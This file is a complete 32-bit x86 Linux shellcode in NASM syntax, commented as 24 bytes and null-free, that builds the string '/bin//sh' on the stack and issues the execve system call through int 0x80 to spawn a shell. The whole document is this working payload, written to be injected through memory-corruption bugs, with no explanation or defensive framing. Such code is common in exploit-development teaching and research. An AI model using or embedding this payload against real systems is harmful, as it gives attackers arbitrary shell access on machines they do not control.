BITS 32

; 24 bytes
; null free
; assumes no particular register values

xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push edx
push ebx
mov ecx, esp
lea eax, [edx+0xb]
int 0x80
